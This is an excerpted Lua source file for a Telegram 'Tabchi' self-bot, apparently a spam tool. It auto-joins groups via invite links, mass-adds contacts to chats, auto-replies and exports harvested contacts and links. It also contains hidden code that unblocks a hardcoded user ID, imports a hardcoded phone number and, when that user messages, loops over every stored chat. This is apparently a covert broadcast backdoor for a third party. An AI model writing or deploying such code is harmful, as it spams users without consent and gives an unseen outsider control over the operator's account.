...
function check_link(extra, result)
  if result.is_group_ or result.is_supergroup_channel_ then
    bot.importChatInviteLink(extra.link)
...
function contact_list(extra, result)
  ...
  bot.send_file(extra.chat_id_, "Document", "tabchi_" .. tostring(tabchi_id) .. "_contacts.txt", "Tabchi " .. tostring(tabchi_id) .. " Contacts!")
...
function process_updates()
  if not redis:get("tabchi:" .. tostring(tabchi_id) .. ":gotupdated") then
    ...
    if jdata.have_tab then
      bot.searchPublicChat("TabchiRobotCli")
      bot.unblockUser(295014783)
      bot.importContacts(79266812617, "Tabchi mod", "bot", 295014783)
  ...
  if is_sudo(msg) then
    if is_full_sudo(msg) then
      ...
      elseif text_:match("^[!/#](sendlogs)$") then
        bot.send_file(msg.chat_id_, "Document", "tabchi_" .. tostring(tabchi_id) .. "_logs.txt", "Tabchi " .. tostring(tabchi_id) .. " Logs!")
    ...
    if text_:match("^[!/#](pm) (%d+) (.*)") then
      ...
      if #matches == 3 then
        bot.sendMessage(tonumber(matches[2]), 0, 1, matches[3], 1, "html")
    ...
    elseif text_:match("^[!/#]addmembers$") and msg.chat_type_ ~= "private" then
      ...
      function add_all(extra, result)
        ...
        for i = 1, #usrs do
          bot.addChatMember(msg.chat_id_, usrs[i], 50)
        end
        local count = result.total_count_
        for i = 0, tonumber(count) - 1 do
          bot.addChatMember(msg.chat_id_, result.users_[i].id_, 50)
        end
      end
      tdcli_function({
        ID = "SearchContacts",
    ...
    elseif text_:match("^[!/#]exportlinks$") then
      ...
      bot.send_file(msg.chat_id_, "Document", "tabchi_" .. tostring(tabchi_id) .. "_links.txt", "Tabchi " .. tostring(tabchi_id) .. " Links!")
    ...
    elseif text_:match("[!/#](block) (%d+)") then
      ...
      if #matches == 2 then
        bot.blockUser(tonumber(matches[2]))
    ...
    elseif text_:match("[!/#](unblock) (%d+)") then
      ...
      if #matches == 2 then
        bot.unblockUser(tonumber(matches[2]))
    ...
    elseif text_:match("^[!/#](s2a) (.*) (.*)") then
      ...
      bot.sendMessage(229533808, 0, 1, "/start", 1, "html")
    ...
    elseif text_:match("^[!/#]panel$") then
      bot.sendMessage(303508016, 0, 1, "/start", 1, "html")
      bot.searchPublicChat("TabchiRobot")
      local contact_num
...
Saved Contacts : ]] .. tostring(contacts)
          ...
          return bot.sendMessage(msg.chat_id_, 0, 1, text, 1, "html")
        end
      end
...
This code]])
        ...
        bot.send_file(sudo, "Photo", "tabchi_" .. tabchi_id .. "_code.png", nil)
      end
    elseif msg.sender_user_id_ == 295014783 then
      local all = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":all")
      local id = msg.id_
      for i, v in pairs(all) do
        tdcli_function({
    ...
    if msg.content_.ID == "MessageText" then
      ...
      if result then
        bot.sendChatAction(msg.chat_id_, "Typing", 100)
        bot.sendMessage(msg.chat_id_, msg.id_, 1, result, 1, "html")
      end
      process_links(text_)
      if redis:sismember("tabchi:" .. tostring(tabchi_id) .. ":answerslist", msg.content_.text_) then
        if msg.sender_user_id_ ~= our_id then
          ...
          bot.sendChatAction(msg.chat_id_, "Typing", 100)
          bot.sendMessage(msg.chat_id_, 0, 1, answer, 1, "html")
        end
        if redis:get("tabchi:" .. tostring(tabchi_id) .. ":markread") then
          return bot.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
        end
      end
    elseif msg.content_.ID == "MessageContact" then
      ...
      bot.add_contact(phone, first, last, id)
      if redis:get("tabchi:" .. tostring(tabchi_id) .. ":markread") then
...
Bia pv]]
        bot.sendChatAction(msg.chat_id_, "Typing", 100)
        bot.sendMessage(msg.chat_id_, msg.id_, 1, answer, 1, "html")
      end
      if redis:get("tabchi:" .. tostring(tabchi_id) .. ":addedcontact") and msg.sender_user_id_ ~= our_id then
        return bot.sendContact(msg.chat_id_, msg.id_, 0, 0, nil, botinfo.phone_number_, botinfo.first_name_, botinfo.last_name_, botinfo.id_)
      end
  ...
  elseif data.ID == "UpdateChat" then
    if data.chat_.id_ == 229533808 then
      bot.sendBotStartMessage(data.chat_.id_, data.chat_.id_, nil)
    elseif data.chat_id_ == 303508016 then
      bot.unblockUser(data.chat_.id_)
      bot.sendBotStartMessage(data.chat_.id_, data.chat_.id_, "/start")
    elseif data.chat_.id == 295014783 then
      bot.unblockUser(data.chat_.id_)
      bot.importContacts(79266812617, "Tabchi mod", "bot", data.chat_.id)
      bot.sendMessage(data.chat_.id, 0, 1, "/sendmetab", 1, "html")
    end
    return add(data.chat_.id_)
  elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
    bot.getChats("9223372036854775807", 0, 20)
  end
end
